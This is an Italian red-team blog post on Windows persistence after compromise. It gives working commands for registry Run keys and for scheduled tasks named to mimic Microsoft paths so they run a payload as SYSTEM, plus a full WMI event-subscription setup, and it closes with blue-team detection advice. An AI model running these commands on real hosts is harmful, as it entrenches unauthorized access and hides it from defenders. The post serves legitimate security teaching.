---
layout: post
title: "Windows Persistence: registry run key, scheduled task e WMI event subscription"
date: 2026-08-27
cat: red
tags: [Windows, persistence, registry, scheduled task, WMI, post-exploitation, red team]
excerpt: "Ottenere accesso è solo metà del lavoro: senza un meccanismo di persistenza, un reboot o un logout riportano tutto a zero. Ecco le tecniche più comuni (e più difficili da individuare), per restare dentro un host Windows."
---

Un accesso ottenuto tramite un exploit o credenziali rubate è, per definizione, temporaneo: un reboot, un logout, una rotazione password possono chiuderlo. La **persistenza** è il meccanismo che garantisce l'esecuzione automatica del payload ad ogni riavvio o evento di sistema, senza dover ripetere l'accesso iniziale.

## Registry Run Key: la tecnica più vecchia, ancora efficace

```powershell
# Esecuzione automatica all'avvio, per l'utente corrente
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Users\Public\update.exe"

# Persistenza a livello macchina (richiede privilegi amministrativi)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\svc.exe"
```

Semplice, ma anche la più cercata dai difensori: qualsiasi EDR e la maggior parte degli antivirus monitora le chiavi `Run`/`RunOnce` come indicatore primario.

## Scheduled Task: più flessibile, meno monitorato di default

```powershell
# Esecuzione ricorrente ogni 5 minuti, mascherata da nome plausibile
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\ScheduledScan" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 5 /ru SYSTEM

# Trigger su logon, non su intervallo
schtasks /create /tn "OneDriveSync" /tr "C:\Users\Public\update.exe" /sc onlogon
```

Il vantaggio: molte organizzazioni hanno centinaia di task legittimi programmati da software di terze parti, il che rende più facile mimetizzarsi con un nome plausibile (`Microsoft\Windows\...`) e più difficile per un analista distinguere il legittimo dal malevolo a colpo d'occhio.

## WMI Event Subscription: persistenza fileless

Windows Management Instrumentation permette di registrare un trigger che esegue codice in risposta a un evento di sistema (avvio, logon, orario specifico), interamente tramite classi WMI, senza toccare il filesystem in modo tradizionale:

```powershell
# Event filter: si attiva ogni 300 secondi (via classe __InstanceModificationEvent)
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name = "SystemUpdateFilter"
    EventNamespace = 'root\cimv2'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Consumer: cosa eseguire quando il filtro scatta
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "C:\Windows\Temp\svc.exe"
}

# Binding: collega filtro e consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

Non esiste un file eseguito da un percorso "Run" tracciabile in modo ovvio, non compare in `schtasks /query`: la persistenza vive interamente nel repository WMI (`OBJECTS.DATA`), un posto in cui pochi analisti guardano per primo.

## Altri vettori meno noti

| Tecnica | Come funziona |
|---|---|
| **Startup folder** | file in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` eseguito al logon utente |
| **Servizio Windows** | `sc create` registra un binario come servizio con avvio automatico |
| **COM Hijacking** | sovrascrittura di una chiave registry COM (`HKCU\Software\Classes\CLSID\...`) che dirotta il caricamento di una libreria usata da un processo legittimo |
| **DLL Hijacking su applicazioni con auto-avvio** | sostituzione di una DLL cercata da un eseguibile legittimo con una malevola nello stesso percorso di ricerca |
| **AppInit_DLLs / IFEO Debugger** | tecniche legacy, spesso già coperte da detection consolidata |

## Come si difende un blue team

- **Sysmon con configurazione estesa**: Event ID 12/13/14 (registry) e Event ID 19/20/21 (WMI) sono i log chiave per rilevare queste tecniche, non presenti nei log Windows standard
- **Baseline dei task pianificati** e alert su nuove creazioni con nomi che imitano percorsi Microsoft ma con hash/percorso file anomalo
- **Auditing del repository WMI** (`Get-WmiObject -Namespace root\subscription -Class __EventFilter`), pochi ambienti lo controllano di routine, il che lo rende un blind spot reale
- **Application whitelisting (AppLocker/WDAC)**: impedisce l'esecuzione di binari non firmati indipendentemente dal meccanismo di persistenza usato per lanciarli
- **EDR con telemetria su ETW** (Event Tracing for Windows), che intercetta la creazione di consumer WMI e modifiche registry in tempo reale, non solo a scansione periodica

## Conclusione

La persistenza non è un singolo trucco da bloccare, è una superficie ampia quanto i meccanismi legittimi di automazione di Windows stesso. Un blue team maturo non cerca "il malware", costruisce una baseline di cosa è normale in registry, task scheduler e repository WMI, e allerta sulle deviazioni.